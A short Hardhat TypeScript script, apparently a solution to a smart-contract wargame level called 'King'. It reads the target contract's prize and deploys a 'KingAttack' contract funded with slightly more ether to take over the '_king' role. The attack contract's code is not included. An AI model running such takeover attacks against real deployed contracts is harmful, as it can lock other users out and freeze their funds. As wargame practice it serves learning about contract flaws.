import { ethers } from "hardhat";
import fs from "fs";
import path from "path";
import { formatEther } from "ethers";

async function main() {
  // get contract by address & abi
  const instanceAddress = "0xf493c382Dc18F403164DA9F5214A6c4B4F30b2Bd";

  const abiPath = path.join(__dirname, "..", "abis", "king.json");
  if (!fs.existsSync(abiPath)) {
    console.error(`ABI file not found at ${abiPath}`);
    process.exit(1);
  }
  const abiJson = JSON.parse(fs.readFileSync(abiPath, "utf8"));

  const [signer] = await ethers.getSigners();

  const contract = new ethers.Contract(instanceAddress, abiJson, signer);
  console.log("Attached to contract:", contract.target);

  // function call
  const prize = await contract.prize();
  console.log("Current prize:", formatEther(prize));

  const attackValue = prize + ethers.parseEther("0.001");

  const attackContract = await ethers.getContractFactory("KingAttack");
  const atack = await attackContract.deploy(instanceAddress, {
    value: attackValue,
  });
  await atack.waitForDeployment();

  console.log(await contract._king());
}

main().catch((err) => {
  console.error("Error:", err);
  process.exitCode = 1;
});
